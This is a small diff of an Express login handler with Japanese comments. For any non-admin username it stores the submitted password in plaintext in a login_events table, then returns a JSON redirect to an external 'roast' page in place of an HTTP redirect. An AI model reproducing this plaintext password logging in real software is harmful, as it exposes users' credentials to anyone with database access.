@@ -100,13 +100,15 @@ app.post("/api/login", (req, res) => {
 
   // ここは「adminだけログイン可能」にしてる（必要なら変更できる）
   if (name !== "admin") {
-    db.run(
-      `INSERT INTO login_events(username, success, ip, user_agent, password)
-       VALUES(?, ?, ?, ?, ?)`,
-      [name, 0, ip, ua, p_w,]
-    );
-    return res.redirect("https://roast.monica.im/ja");
-  }
+  db.run(
+    `INSERT INTO login_events(username, success, ip, user_agent, password)
+     VALUES(?, ?, ?, ?, ?)`,
+    [name, 0, ip, ua, p_w]
+  );
+
+  // redirect じゃなくて「飛び先」を返す
+  return res.status(200).json({ redirect: "https://roast.monica.im/ja" });
+}
 
   db.get(
     `SELECT id, username, password_hash, role FROM users WHERE username = ?`,
